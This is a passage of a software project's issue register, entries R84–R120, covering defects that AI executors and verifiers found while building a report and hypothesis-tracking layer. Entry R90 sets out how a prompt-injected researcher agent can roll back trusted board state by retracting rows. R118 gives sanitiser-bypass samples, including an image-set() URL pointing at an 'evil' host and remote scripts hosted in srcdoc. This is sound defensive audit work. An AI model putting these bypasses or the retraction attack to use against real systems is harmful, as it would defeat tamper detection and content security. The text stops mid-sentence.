| **R84** | **`go/httpapi` has a cross-test isolation flake that only surfaces under heavy load.** During wave 3's gates, O4's whole-module `go test ./...` failed `TestCreateSessionWithWorkerAttachesIdentityAndPrompt` with `session.worker = ""`, immediately preceded by `httpapi: session s-race was deleted while it was being created; create aborted`. `s-race` belongs to `session_orphan_test.go`, a deliberate concurrent create-vs-delete test; its goroutine outlives the test and mutates the shared memstore the next test is using. **Not caused by any wave-2 or wave-3 ticket** — O4's diff touches only `cmd/agentd/datasettoken*.go` and `extension/devclaims/*`, and the same test passes 3/3 in the full `httpapi` package on the O4 branch, 30/30 on `main`, and cleanly under `-race`. It reproduced only when two whole-module runs were executed in parallel, which the orchestrator was doing. **Consequence for future waves: do not run two `go test ./...` invocations concurrently**, and treat a lone `httpapi` failure naming `s-race` as this flake rather than as a ticket defect. The real fix — making `session_orphan_test.go` wait for its goroutine, or giving it its own store — belongs to whichever ticket next edits that file. | O4 (cleared), any wave running parallel Go gates |
| **R85** | **The import-boundary checker scanned raw source, so prose in a comment could manufacture an import.** Discovered at the wave-4 pre-flight merge, and only there: W1b's checker and W7's `api/src/config.ts` are each green alone, but merged, `api/`'s boundary suite failed with a bare specifier `" in X1"`. The cause is `IMPORT_SPECIFIER_PATTERNS[0]` matching W7's comment *a shell &#96;export&#96; in X1's &#96;run.sh&#96;* — the `export` keyword, the backtick closing it, `" in X1"`, and the apostrophe in `X1's`. **This is the first defect any wave produced that no single ticket could have caught**, because both halves were correct in isolation; it is an argument for merging at every wave boundary rather than accumulating branches. Fixed on merged `main` (`9846bb4`): `allImportSpecifiers` strips comments first, with two regression cases — prose does not manufacture a specifier, and a real escaping import below a comment is still caught. The first was proven to fail without the fix. | **Resolved** — agent-wolf `main` |
| **R86** | **`go/cmd/agentd/main.go`'s ownership row omitted O5 for three revisions.** § "Parallelism and file ownership" listed the file as *O6b, O8* while O5's own Files line requires modifying it to wire `DatasetBlobs`. Two tickets would have run concurrently on the same file with nothing in the plan saying not to. The orchestrator caught it while cutting wave 4 and serialised O5 → O8 by hand (O5 first, O8 branched from post-O5 `main`). O5's change is 7 lines in one struct literal and O8 merged on top without conflict. **Row corrected.** Generalise: the ownership table is derived from Files lines and nothing checks the two agree — a mechanical cross-check would have found this in a second. | **Resolved** — O5, O6b, O8 |
| **R87** | **O6a's argv criterion contradicted its own mandated argv.** The ticket said "a test asserts no command element is `sh`, `bash` or `-c`" while pinning the size probe as `[]string{"wc","-c",abs}` — read literally, the test must fail against the very command the ticket mandates. The executor implemented the evidently-intended check (`cmd[0]` is not `sh`/`bash`) and **reported the contradiction instead of silently dropping half of it**, which is the behaviour the plan wants. The verifier separately noted the shipped assertion is near-redundant (the fake rejects any unknown `cmd[0]` anyway) and wrote a real exact-argv assertion itself. **Criterion corrected.** | **Resolved** — O6a |
| **R88** | **§ "Interfaces → Memory append route (O7)" printed a doubled prefix in its example body.** The example wrote `"name":"hyp-1a2b3c4d"` while § "Memory kinds" pins the label as the bare id and § "Vocabulary" says the `hyp-` prefix belongs to the session name **and to nothing else**. Any ticket copying the printed example — the most likely thing an executor does — would write rows that match none of W5's selectors, and every hypothesis would read as having no state row. Exactly the `hyp-hyp-` family the Vocabulary warning exists to prevent, sitting in the plan's own worked example. Found by W5. **Example corrected to the bare id.** | **Resolved** — O7, W5, W8, W9 |
| **R89** | **§ "Shared shapes" was factually wrong about the engine: `Tamper`'s two provenance fields are not mutually exclusive.** The plan pinned "exactly one of the two provenance fields is non-empty". Orange sets **both** for any session that has a worker (`go/cmd/agentd/mcpserver.go`) — which is every researcher tick, and every interview session too, since W8 creates those with `worker: "interviewer"`. W5 proved it against two independently captured live fixtures and implements the `at least one` form. This is a correction of fact, not a preference: the `exactly one` form is unsatisfiable against the running engine. **Shape corrected. X1's tamper-resistance spec must NOT assert the `exactly one` form**, and W8, W13 and W14 read the corrected shape. | **Resolved** — W5, W8, W13, W14, X1 |
| **R90** | **THE PLAN'S OWN BOARD CRITERION REOPENED THE RESURRECTION ATTACK.** § "The trust model"'s two-step and W5's board criterion both pinned a board URL *without* `include_retracted=1`. Orange's `notRetractedSQL` then hides Wolf's newest `kind=hypothesis` row and `latest_per` hands back the OLDER trusted row beneath it — which passes the trust rule, so it renders as authoritative **with no tamper flag at all**. A prompt-injected researcher that merely **retracts** Wolf's newest state row therefore rolls the board back to the previous status, silently, on the exact surface W8's board and W13's banner render; the detail read was correct, so the two surfaces disagreed without either looking wrong. **W5's independent verifier constructed the attack and it worked.** The implementation was not at fault — it followed the criterion literally — so this is a contradiction *inside* the plan: § "The trust model"'s restated rule already says state is resolved from memories read with retractions visible. Fixed with one query parameter, which keeps the clean case at exactly one request and is what O11's paired criterion (*"this pair is the contract W5's tamper detection is written against"*) was written for. **Both the section and the criterion are corrected.** This is the single most valuable thing the adversarial-verify step has produced across four waves. | **Resolved** — W5, W8, W13, W14, X1 |
| **R91** | **W2's "exhaustive and closed" route list has no worker READ, but W12's idempotency criterion cannot be met without one.** W2 carries `putWorker`/`deleteWorker` and no `GET /agent/workers/{name}`, while Orange serves one (`go/httpapi/workers.go:77`) and W12 is graded on "a second run creates nothing and mutates nothing" — undecidable without reading current worker state. W12 resolved it with one narrowly-scoped raw `fetch` inside `bootstrap-project.ts`, documented at length at its call site: not a second client, and it does not touch `client.ts`. But it is a second, unretried, unmapped HTTP path in a repo whose plan wanted exactly one. **RESOLVED by owner decision 2026-08-21: add the route.** Kai's ruling — *"let's add a new route. That's fine. Add to W2's closed route list."* Written up as **W2b**, which adds `getWorker(name)` with the same retry/timeout/error-mapping path as every other route, maps its 404 to `not_found` rather than the retryable `unavailable`, repoints W12's bootstrap at it so the repo's one raw `fetch` disappears, and updates W2's own "exhaustive and closed" comment to say twenty-three. W2b depends on **W15** as well as W2 and W12, because W15 holds `client.ts` immediately before it and fixes three defects in the error taxonomy this ticket's mapping criterion is graded against. | **Resolved** — W2b |
| **R92** | **The bootstrap script needs an Orange base URL and a project API key, and neither is pinned anywhere.** W12's Depends-on is W2 + W7 and its Files line restricts `config.ts`/`.env.example` to `WOLF_BASE_IMAGE` and `WOLF_CRITIC_CRON`, but constructing an `OrangeClient` needs `ORANGE_BASE_URL` and `WOLF_API_KEY`. Both are added by W8/W9 — wave-4 siblings W12 does not depend on. W12 reads them straight from `process.env` in a function that bypasses the typed `WolfConfig`, with a hardcoded `http://localhost:8099` default. This is where **R49**'s "Orange's base-URL variable, pinned nowhere" finally landed. Consequence: an operator running `scripts/bootstrap-project.ts` before W8/W9 land finds no `.env.example` guidance for either variable. Separately, `scripts/bootstrap-project.ts` sits at repo root importing into `api/src/`, and `api/tsconfig.json` does not cover repo-root `scripts/` — so `yarn typecheck` never sees it and nothing proves it even resolves under `tsx`. | **Open** — W8, W9, or a plan revision |
| **R93** | **`prompts/researcher-preamble.md` contains the method-body marker TWICE as a substring, and W9's splitter must be line-anchored.** The literal `<!-- WOLF:METHOD-BODY -->` appears once as prose inside backticks near the top of the file (usefully — it documents the boundary) and once as the real boundary line. A splitter using `indexOf` or a bare-substring `split` cuts at the prose occurrence and **silently makes most of the locked preamble mutable**, which is the whole thing the locked preamble exists to prevent. W12 shipped a test pinning "appears as a whole line exactly once" so a future edit cannot break the assumption unnoticed. **W9's ticket now states the requirement explicitly**: `split("\n")` then `line.trim() === marker`, never `indexOf`. | **Resolved** — W9, W12 |
| **R94** | **Two files that tickets actually edit were on no ownership row: `prompts/*.md` and `api/src/config.test.ts`.** W12 authors the four prompts and W25 rewrites the report-authoring half, with nothing serialising them; and W12 landed 68 lines in `api/src/config.test.ts`, a file on no Files line and no ownership row, so a concurrent `config.ts` ticket could collide there unserialised. Both rows added. Same root cause as **R86** and **R81**: the ownership table is maintained by hand and nothing cross-checks it against the Files lines it is supposed to summarise. Three separate waves have now found a missing row. **A mechanical check — every path in any Files line either appears in the table or is created by exactly one ticket — would end this class.** | **Resolved** (rows added) — the mechanical check remains unbuilt |
| **R95** | **A wave that runs several tickets concurrently leaves throwaway containers behind, because house rule 9 forbids workers removing them.** Wave 4 ended with six `agentkit-testpg-*` instances on ports 5433–5438 plus a verifier's DinD: agents correctly created their own rather than colliding, correctly refused to `docker rm` anything, and correctly reported what they left. The rule is right — an agent removing a sibling's database mid-run is far worse than an idle container — but the sweep has no owner. **The orchestrator should sweep between waves**, and did. | **Informational** — orchestrator housekeeping |
| **R96** | **O8's Validation named a path that does not exist.** The ticket said `TestProjectMapExample` reads the `AGENTKIT_PROJECT_MAP` line out of `../../.env.example` from `go/cmd/agentd/` — two `..` segments, which resolves to `go/.env.example`. `.env.example` is at the repo root, **three** levels up, matching the existing convention in `cmd/hypolabgen`, `cmd/triagelabgen` and `cmd/gauntletgen`, all of which use `filepath.Join("..","..","..", …)`. A strict literal reading would have produced a test that cannot open its own fixture. The executor implemented three segments and reported the discrepancy. Same family as **R87**: a path or argv written by hand in the plan and never executed. | **Resolved** — O8 |
| **R97** | **Two operator traps O8 surfaced and correctly left for O10.** (1) `.env.example` now carries the worked `AGENTKIT_MCP_ENV=WOLF_MCP_TOKEN` value only as an **indented in-prose comment** inside the Wolf block, while the file's column-0 declaration line `# AGENTKIT_MCP_ENV=` remains empty. An operator who uncomments the declaration gets an empty allowlist and `WOLF_MCP_TOKEN` **silently never reaches a session container** — the failure mode is a tool that is configured, mounted and inert. (2) `TestProjectMapExample` asserts the wolf project has exactly one allowed origin and that `validateOrigin` accepts it, but never that it **equals** `http://localhost:8081`; a typo'd port keeps the test green while the embed page's `frame-ancestors` CSP silently refuses to frame wolf-web. Both are one line each. Separately, `.env.example` now shows **two** `AGENTKIT_PROJECT_MAP` examples — the legacy flat form O8 does not own, and the new object form — with nothing inline explaining the relationship. | **Open** — O10 |
| **R98** | **`api/src/hypothesis/store.ts`'s ownership row omitted W8 and printed an order the dependency graph contradicts.** W8's own Files line modifies `store.ts` and `store.test.ts`, but the row read *W5, W10, W15, W22* and never mentioned W8 — so the two tickets that became wave 5's chain heads would have run concurrently on the same file with nothing in the plan saying not to. The printed order was also wrong on its own terms: it put W10 before W15 although W15's Depends-on is `W5, O11` and W10 sits four tickets deep behind W8 → W9, so honouring it would have serialised the entire report layer behind the UI chain for no dependency reason. **Row corrected to W5, W8, W15, W10, W22**, and W8 goes first in wave 5 because its chain is the longer one. This is the **fourth** wave in a row to find a missing or wrong ownership row (R81, R86, R94, now R98) — the mechanical cross-check R94 describes would have caught every one of them, and is now the highest-value unbuilt item in this plan. | **Resolved** — W8, W15 |
| **R99** | **`WOLF_TEST_LOGIN` plus `NODE_ENV=production` is now a boot failure, and `.env.example` ships `NODE_ENV=production`.** W8's `loadConfig` refuses the test-login variable outside development, which is correct — but it means **X1's `run.sh` must export `NODE_ENV=development` (or `test`) for the Wolf stack or nothing boots at all**, and the failure is at boot, before any test runs, in the one ticket with the most moving parts. Nobody would guess it from `.env.example`, which is the file an operator copies. Found by W8, which cannot fix it because `run.sh` is X1's. | **Open** — X1 |
| **R100** | **There is no way for the UI to ask "am I signed in, and as whom?", and no way to sign out.** The plan's route table has no `GET /api/auth/me` and no logout route. W13 must therefore infer the signed-in state from a 401 on the board, and a signed-in user cannot sign out except by waiting the cookie's 12 hours or by the operator rotating `WOLF_SESSION_SECRET` — which signs *everyone* out. Not W8's to add (its criteria enumerate its routes and neither is among them). **RESOLVED by owner decision 2026-08-21: add both.** Kai's ruling — *"let's add api.auth.me and log out."* Written up as **W8b**, and added to § "Wolf API routes". Two shapes worth noting, both decided here rather than left to the executor: **logout is `POST`, never `GET`**, because a `GET` logout is triggerable by a prefetch, an `<img>` tag or a link inside a report panel — a cross-site sign-out, and this product renders model-authored HTML; and **logout with no valid cookie returns 204, not 401**, because signing out when already signed out is not an error and a 401 makes the sign-out button fail exactly when a user most wants it — on an expired session. W13's Depends-on now names W8b. | **Resolved** — W8b, W13 |
| **R101** | **Two owner rulings on 2026-08-21 added the plan's first two new tickets since revision 4** — W8b (`/api/auth/me` + logout, closing R100) and W2b (the twenty-third Orange route, closing R91). Ticket count 39 → 41. Both are small and both close a debt an earlier ticket found and correctly refused to fix because the file was not its. Recorded as an entry in its own right because the plan's ticket list is otherwise fixed, and a reader comparing the count against revision 4's header should find the reason rather than a discrepancy. W8b runs immediately (it shares no file with anything in flight); W2b waits for W15 to land, since W15 holds `client.ts` first. | **Informational** |
| **R102** | **A verifier brief written by the orchestrator contained an error that would have produced a FALSE blocking defect.** W8b's verifier was told to "confirm neither `/mcp` nor `/series/download` is 401". `/mcp` **is** 401 without credentials — legitimately, from its own MCP-token guard — and W8's `api/src/app.test.ts:80-87` asserts exactly that. The real invariant is that the 401 must not come from the **cookie guard**, which the verifier proved by response **body shape** rather than by status code, and then said so plainly instead of failing the ticket. A verifier following the brief literally would have raised a blocking defect against correct code and burned a fix round. **Two lessons.** (1) The briefs are as much a source of defects as the plan is, and nothing reviews them — they are written fresh each wave by the orchestrator and go straight to an agent. (2) The instruction to verifiers to **grade the ticket, not just the code** is load-bearing and should stay in every brief; it is what turned an orchestrator error into a report instead of a false failure. Also **R103**'s sibling finding: the same ticket's criterion said "normalised the same way W8 normalises it" — W8 lower-cases but does **not** trim. | **Informational** — orchestrator practice |
| **R103** | **`setSessionCookie` lower-cases the email but does not trim it, so an untrimmed address is what lands in the signed cookie.** `api/src/auth/session.ts:115`. W8b handles it at its own read site, so `GET /api/auth/me` is correct — but **W9, W10 and W11 mount `requireSignedIn` and read `req.wolfUser.email` directly**, and will each inherit an address with surrounding whitespace. Every downstream comparison (allowlist checks, `owner` labels on memories, the K8s label charset, which forbids spaces) is then a whitespace bug waiting to happen, and it will present as "this user's hypotheses do not appear" rather than as anything auth-shaped. **The durable fix is one call at the mint site**, in W8's file, not at three read sites. **Recommendation: add `api/src/auth/session.ts` to W9's Files line and a criterion that the mint site trims**, since W9 is the next ticket to mount the guard. Found by W8b's verifier. **Done 2026-08-21 (wave-6 pre-flight): `session.ts` + `session.test.ts` are on W9's Files line, W9 carries the trim criterion with a `"  Kai@Example.COM  "` case, and the ownership table has the row.** Separately and needing no action: `requireSignedIn` deliberately does not clear an expired cookie because the bare middleware has no config to build matching flags from — now that `POST /api/auth/logout` exists the UI has a real remedy, so that comment's premise has changed. | **Resolved** — folded into W9 |
| **R104** | 🟡 **MITIGATED IN WOLF, still open in Orange (reviewed 2026-08-24).** `getCurrentMemory` asserts the expected `kind` client-side and throws `not_found` when the newest memory with that name is a different kind (`api/src/orange/client.ts:695-718`), so Wolf **fails loudly rather than returning the wrong memory**. The route stays unusable whenever a different kind was written more recently; fixing Orange is the owner's call and nothing in this plan is blocked on it. Original finding: **`GET /agent/memories/current?name=` cannot do what four tickets assume it does, and for Wolf it is close to useless.** Orange builds the selector as literally `"name=" + name` (`go/httpapi/memories.go:391`) and accepts no other query parameter — no `kind=`, no `selector=`, no `include_retracted=1`. **In Wolf's vocabulary EVERY kind shares `name=<hypothesis id>`** — `hypothesis`, `hypothesis-spec`, `verdict`, `evaluation`, `report-template`, `research-note`, `report` — so the route answers with whatever the researcher happened to write most recently, whatever kind that was. It is also blind to retractions, which makes it unusable for anything the trust model touches. W15 implemented its `kind` argument as a **client-side assertion** (mismatch → `not_found`) and used `listMemories` with a `kind=,name=` selector everywhere it actually mattered, which is correct but means the route is doing almost none of the work its callers expect. **Owner decision wanted: either add a `kind=` (or `selector=`) parameter to that Orange route, or strike it from the tickets that assume it** — leaving it as-is invites a later ticket to call it and silently read the wrong row. Note this route is one of the embeddable-Orange features `docs/19-embedding.md` advertises, so the fix is not Wolf-local. | **Open** — an Orange-side ticket, or the tickets that call it |
| **R105** | **Four tickets are instructed to "reuse `present()`" and none of them can: it is module-private.** `api/src/hypothesis/spec.ts`'s `present()` helper is W3's reference implementation of **R62** ("explicit `null` means ABSENT"), and § "Vocabulary" points at it by name — but it is not exported. Every instruction to reuse it is therefore unsatisfiable without editing a file W3 owns, and the executor's only options are to duplicate the logic or to touch a file outside its Files line. **Either export it or stop pointing tickets at it.** The orchestrator's own wave-4 and wave-5 briefings repeated the instruction verbatim, which is the same class as **R102**: a briefing asserting a capability nobody checked. **Exported 2026-08-21 in the wave-6 pre-flight (`7375e09`), one word, no behaviour change.** ⚠️ **The entry as first written was also imprecise, and the imprecision is the more dangerous half: there are TWO different `present()` helpers under the same name.** W3's, `api/src/hypothesis/spec.ts:244`, is `present(record, key): boolean` and implements **R62** (explicit `null` means absent, for spec objects). W7's, `api/src/config.ts:86`, is `present(value): string \| undefined` and implements **R80** (compose forwards an unset variable as `""`). They solve unrelated problems and are not interchangeable. R80's row lists W9, W10, W11, W16, W21 and X1 as needing "the same treatment" — every one of those means the **config** helper, and every one of them adds its variables *inside* `config.ts`, so none needs an export at all. Any briefing that says "reuse `present()`" without naming the module is ambiguous between the two. | **Resolved** — exported; both helpers disambiguated above |
| **R106** | **The board/detail tamper asymmetry W5 recorded will reappear in the report layer, and W22 is where.** W5's Notes record that `readBoard` resolves from one row per name while `readHypothesis` sees up to 50, so the two surfaces can report different `tamper` arrays for the same hypothesis. The report layer reproduces the shape exactly: **W22's board headline comes from a `latest_per` snippet read while `readLatestReport` does a per-name read**, so the same divergence returns for reports. Worth a line in W22's criteria stating the expected behaviour **before** it is found as a bug and "fixed" by widening the board read, which is the change W5's criterion deliberately does not make. | **Open** — W22 |
| **R107** | **The per-instance `KeyedMutex` hazard is live, has now been flagged by two separate tickets, and is assigned to nobody.** W5 built transition serialisation on a `KeyedMutex` held per `HypothesisStore` **instance**, so it holds only if wolf-api constructs exactly one store for the whole process — and W8, W9 and W10 each construct their own dependencies with nothing enforcing it. W5 flagged it; W15 flagged it again while confirming its own two reads are read-only and do not worsen it. Nothing owns it. The failure mode is two concurrent transitions on one hypothesis interleaving, which is rare, non-deterministic, and writes an append-only memory — so it corrupts the record rather than erroring. **Either make the store a module-level singleton, or hoist the mutex to module scope; whichever, it needs an owner.** | **Open** — unassigned |
| **R108** | **A third ticket written the same day from an owner ruling carried a wording error its verifier had to catch.** W2b's first criterion said the result type must be "the same worker shape `putWorker` **accepts**". What `putWorker` accepts is `PutWorkerParams` — an all-optional params bag carrying a `rationale` field no read can ever return — so taken literally the criterion is unsatisfiable and would force the wrong type. The executor used `WorkerRecord`, the type `putWorker` returns, and the verifier graded the sane reading and flagged the wording so the plan could be corrected rather than the code. **Corrected.** Together with **R102** (a verifier brief that would have produced a false blocking defect) and **R105** (four tickets told to reuse a module-private helper), this is the third same-day authoring error in one session, all three caught by an executor or a verifier rather than by review. The pattern is clear and worth stating: **text written by the orchestrator between waves gets no adversarial pass, and it is now the plan's most defect-dense surface.** The mitigation that keeps working is the standing instruction to *grade the ticket, not just the code*. | **Resolved** — W2b |
| **R109** | **No test anywhere asserts that any Orange client route sends `X-API-Key`.** W2's shared `intercept` test helper (`api/src/orange/client.test.ts:42-70`) captures path and body only, and the sole grep hit for the header name is a `describe` **title** whose two cases prove only that the key is absent from errors and logs — the opposite property. So the client's single authentication mechanism, shared by all twenty-three routes, is ungated: a change that dropped the header would keep the entire suite green and fail only against a live agentd, which no unit test reaches. W2b's verifier proved the header is sent by writing a throwaway test, then deleted it as house rules require. **One assertion in the shared helper closes it for every route at once.** Pre-existing from W2; inherited by W2b; owned by nobody. **Closed 2026-08-21 in the wave-6 pre-flight (`7375e09`)**: `intercept` now captures the request's `X-API-Key` and an `afterEach` asserts every dispatched request carried it, gating all twenty-three routes rather than the one a single test would; teardown moved into a `finally` so a failing assertion cannot leak the mock dispatcher into the next test. **Verified load-bearing** — renaming the header in `client.ts` fails **63 of 65** tests in the file, where before the change all 65 passed. | **Resolved** — trunk fix |

| **R110** | **W9 and W16 both add config variables and neither listed `docker-compose.yml`.** The ownership table's own `docker-compose.yml` row names W9 and W16 explicitly, and § "Executor orientation" states the R81 rule — a variable in `.env.example` and `config.ts` still never reaches the container without an `environment:` entry — yet both Files lines stopped at `.env.example`. An executor honouring its Files line literally, as house rules require, would have shipped `WOLF_TEARDOWN_DRAIN_SECONDS`, `WOLF_SCHEDULE_CRON`, `WOLF_REPORT_MAX_BYTES` and `WOLF_SERIES_MAX_POINTS` that are correct in code, documented in `.env.example`, and simply absent at runtime — every one of them silently falling back to its default inside the container, which is exactly the failure R81 was logged for. Found by the wave-6 pre-flight reading the ownership table against the ticket bodies. **This is the fifth ownership-table defect in six waves (R81, R86, R94, R98, R110), and the mechanical check R94 describes — every path in a Files line is either in the ownership table or created by exactly one ticket, and every ticket the table names appears in that ticket's Files line — would have caught all five.** It remains unbuilt and is now the highest-value small item in the plan. **Both Files lines corrected 2026-08-21.** | **Resolved** (the two tickets) / **Open** (R94's check) |

| **R111** | **The R81/R110 rule is now enforced by a test, because six waves of prose did not enforce it.** W9's implementer, told by its brief to check the three places by hand, found that **W12 shipped `WOLF_BASE_IMAGE` and `WOLF_CRITIC_CRON` documented in `.env.example` and read by `config.ts` with no `environment:` entry in `docker-compose.yml`** — so an operator setting `WOLF_CRITIC_CRON` in `.env` got the default inside the container, silently. It merged two waves earlier and was found only because a human-authored brief happened to say "check independently". Fixed on the trunk (`da49393`) together with four mechanical cases at the end of `api/src/config.test.ts`: every `env.X` read in `config.ts` must appear in the `wolf-api` environment block **and** in `.env.example`, no compose entry may name a variable nothing reads (beyond the two documented Compose-only ones), and a non-vacuity guard so a broken scan cannot pass by finding nothing. **Verified load-bearing** — removing the two restored lines fails naming both variables. Every remaining variable cross-checks clean. ⚠️ **A ticket that edits that block to make itself pass has committed a blocking defect**; W16's brief says so explicitly. This is the enforcement half of what **R94** asks for; the *ownership-table* half (every path in a Files line is either in the table or created by exactly one ticket) is still unbuilt, and W9 found the **seventh** instance of it — `api/src/config.test.ts` is on the shared ownership row but was missing from W9's own Files line. | **Resolved** (the compose gap, and the config-variable half of R94) |
| **R112** | **Teardown step 4 contradicts the bullet three lines below it, and W10 already has the answer.** W9's step 4 says "delete every row it returns" of `GET /agent/sessions?worker=researcher-<id>`; the bullet immediately after says "a tick session still in flight is allowed to finish". W9's implementer followed step 4 literally and reported the tension rather than choosing silently. **W10's own criteria spell out the missing exclusion** — never delete a session that is the `session_id` of a pending or running delivery for that worker, because a finished tick reads `running` for up to 30 minutes and could be mid-`dataset_put`. W9's teardown was never given it. The consequence is narrow but real: a `/verdict` or `/retire` issued while a tick is running can delete that tick's session row out from under it. **Recommendation: fold W10's exclusion into the shared teardown when W10 lands** — it is one predicate, in a helper W10 already has to write, and doing it there avoids re-opening W9. Wants an owner ruling only if the intent was actually to kill in-flight ticks. **Ruled by Kai on 2026-08-22: fold it into W10.** Done in the wave-7 pre-flight — `provision.ts` + its test are on W10's Files line, W10 carries the shared-predicate criterion with a `running`-delivery test, the ownership table has the row, and W10's Validation gained the `provision` leg so the fold is actually gated. W9's teardown-order test must still pass unchanged. | **Resolved** — folded into W10 |
| **R113** | **`/amend`'s source of truth was never stated, and the executor picked the safer of two readings.** W9's criterion says `/amend` "re-runs W3's validator over the amended spec" without saying where the amended spec text lives. The implementer read it from the `kind=spec-amendment` memory named by `amendment_id`, and explicitly rejected a spec supplied in the request body on the grounds that **a body-supplied spec would be a second, unaudited way for a human to set the scoreboard** — which is the same property the trust model exists to protect. That reasoning is sound and the shipped behaviour is the one to keep; this row exists so the choice is ratified in the plan rather than left as an undocumented guess that W22 or X1 might contradict. | **Resolved by ratification** — memory-sourced, not body-sourced |
| **R114** | **Two O9 findings for whoever next owns those files, neither in O9's scope.** (1) `httpapi.DownloadDataset` orders the `DatasetScope` pin before the version lookup — correct for the non-oracle rule — but **nothing in the non-integration suite covers the interaction**. A single table case in `httpapi/datasets_test.go` presenting a scoped token against another *name* at a version that name does not have would have caught O9's blocking defect without needing Docker at all. (2) `agentdb` exposes **no way to delete a dataset row**: `ReapDatasetVersions` never deletes the highest version per name, so O9's teardown issues raw SQL through `store.DB()`. Worth knowing for O10's retention section and for any future "delete a dataset" request. Separately: `go test -tags integration ./...` at *module* scope is a trap — `go/systemtest`'s `TestMain` unconditionally shells out to `docker build ../../sandbox` and `os.Exit(1)`s rather than skipping. O9's package-scoped Validation avoids it; anyone generalising that command would not. | **Open** — one cheap httpapi case; the rest recorded |
| **R115** | **The plan's § "The throwaway Postgres" names port 5433 and no wave has used only that port.** Concurrent Go tickets each need their own instance (R95), so every wave has supplied a different port out of band — 5434 in wave 5, 5441 in wave 6 — and every executor has had to be told the real one in its briefing. O9's implementer flagged the mismatch as a discovered issue. The section should say that 5433 is the *canonical single-ticket* instance and that a concurrent wave gets one instance per ticket on orchestrator-assigned ports, so an executor reading the plan alone does not connect to a sibling's database and wonder why its fixtures are already there. | **Open** — one paragraph in § "Executor orientation" |
| **R116** | ✅ **CLOSED. Both sections were written 2026-08-22, empirically verified against `isomorphic-dompurify` ^2, and four of their own defects fixed (R120). Ratified by the owner 2026-08-24, and the CSP half superseded the same day by R129, which DERIVES the origin list from the approved template instead of allowing `https:`. ⚠️ Stale pre-R116 copies of both sections still sit in `design/2026-08-21-agent-wolf-report-layer.md:370,426` with a DIFFERENT CSP string — see R130; mark them superseded before W17 or W19 is cut.** Original finding: **Two sections that W17 and W19 are told to copy BYTE-FOR-BYTE do not exist in the plan.** W17's criterion names § "The slot sanitiser profile, pinned as an ALLOW list" as the source of `SLOT_PROFILE`; W19's names § "The CSP header, byte-for-byte" and adds that the value must be "asserted as a string literal — a substring check does not satisfy this criterion". **Neither section was ever written.** Both tickets are therefore unrunnable as specified: an executor can only invent the profile and the header, which is precisely what "byte-for-byte" exists to forbid, and the criterion would then be self-satisfying. Found by W16's implementer reading forward from its own ticket. **This must be authored before W17 or W19 is cut** — and authored by the owner, not by an executor, because the whole point of pinning them is that they are decided once, centrally, and never drifted. Same class as **R102**/**R105**/**R108**: orchestrator-authored text that no adversarial pass ever saw. | **Open** — blocks W17 and W19 |
| **R117** | **W16's Validation could not exercise its own criterion 2, and its verifier caught it as an authoring defect rather than failing correct code.** The line read `cd api && yarn test src/report/template && yarn typecheck`. That runs exactly one file, and that file touches neither `config.ts`, `.env.example` nor `docker-compose.yml` — so the entire "two variables, three places, through `present()`" criterion was gated by nothing, with `yarn typecheck` compiling rather than exercising. Corrected to `yarn test src/report/template src/config` with a pinned 2-file count. **This is the fourth authoring error caught by an executor or a verifier rather than by review** (after R102, R105, R108) and the second surfaced by the standing instruction to *grade the ticket, not just the code*. The same verifier also used it to flag that the brief's phrase "rejects a 32-character-plus id" is loose against the pinned regex — `^[a-z][a-z0-9-]{0,31}$` makes exactly 32 legal — and graded the ticket's literal regex instead of the brief. ⚠️ **Every ticket whose Validation is a single `yarn test <one-path>` while its criteria span more than one file has this defect.** Worth one sweep before wave 7. | **Resolved** (W16) / **Open** (the sweep) |
| **R118** | **Four minor defects stand in W16's parser, recorded rather than fixed, three of them the same shape: a URL channel the module chose to police but does not reach.** (1) **`image-set()`** is not matched by the CSS URL scanner, so `<style>.a{background:image-set("http://evil/x.png" 1x)}</style>` is accepted while the `url(...)` equivalent is refused. (2) **`iframe[srcdoc]`**, **`meta[http-equiv=refresh]`** and **`object > param[value]`** are unchecked and contribute nothing to `scriptSrcs`, so a srcdoc-hosted remote script is fetched by the browser while the go-live review screen shows the human **zero** remote scripts — which defeats criterion 10's stated purpose rather than merely narrowing it. (3) A **same-document fragment anchor is refused** — `<a href="#chart">` and `<use href="#glyph">` both fail with "must be an absolute `https:` URL", although CSS already has an explicit `#fragment` carve-out for `fill:url(#gradient)`, so the attribute path and the CSS path disagree about fragments. None is in W16's literal criteria, which name only `src` and `href`. **Recommendation: (2) is the one to fix — it silently understates the review screen — and it belongs to W21, which owns that screen. (3) wants one sentence in W25's authoring contract so the worked example is not written and then rejected.** | **Open** — **(2) MOVED to W30, 2026-08-24** (a screen can only show what the inventory holds, and W30 forbids a second walker); (3)→W25 |
| **R119** | **The tree will hold two HTML readers with different tokenisers, as a side effect of file ownership.** W16's Files line excludes `api/package.json` (W17 owns it), so `parseTemplate` had to be hand-written with no dependency — while W17 will shortly pull **jsdom** into `api/` via `isomorphic-dompurify`. The validator and the sanitiser will then disagree about edge cases by construction, and **both of W16's blocking defects were exactly that class of disagreement**. It is a **defensible** outcome — the validator must run on stored bytes with no normalisation, which is why the structure hash forbids re-serialisation and which a DOM-based reader cannot honour — but it should be a decision on the record rather than an accident of which ticket owns `package.json`. Relatedly, § "Pinned technology choices" says "no hand-rolled tag regex" in an entry about **sanitisation**, which on a literal pass reads as forbidding W16's own parser; **one clarifying clause in that row** ("this pins the sanitiser; W16's validator is dependency-free by design") removes the contradiction. **W17's verifier should be told to check the two readers agree on the differential corpus W16's verifier already wrote** — 42 parse5 cases, in W16's test file. | **Open** — one clause, plus a W17 verifier instruction |
| **R120** | **The two sections written to close R116 carried four defects of their own, three found by EXECUTING the profile rather than reading it, and one of them would have emptied every report in the product.** (1) **BLOCKING — `#text` was missing from `ALLOWED_TAGS`.** DOMPurify treats an explicit list as exhaustive *including text nodes*, so the pinned profile stripped every character of prose while leaving the elements standing: `<p class="lead">Gold <strong>rose</strong> 4%.</p>` sanitised to `<p class="lead"><strong></strong></p>`. W17's criteria assert that dangerous tokens are **absent** from the output, so **every one of them would still have passed** on an empty string — the ticket would have gone green while the feature rendered nothing. (2) **`KEEP_CONTENT: false` was the wrong instrument** for a real concern: measured, it turns `<article><p>some analysis</p></article>` into the empty string, so one wrapper element the model happened to reach for silently discards the whole day's analysis. `FORBID_CONTENTS` already suppresses the dangerous case under either setting; corrected to `true`. (3) **`frame-ancestors 'self'` was missing**, and it is one of four directives (`sandbox`, `base-uri`, `form-action`, `frame-ancestors`) **not covered by the `default-src` fallback** — the frame route is authenticated, so without it any third-party page could embed a signed-in user's report. The corrected string names all four and says why, so none is deleted later as redundant. (4) **The section invented an interface it was written to pin:** it justified excluding the `id` attribute by naming a specific element id "the template reads", which **nothing 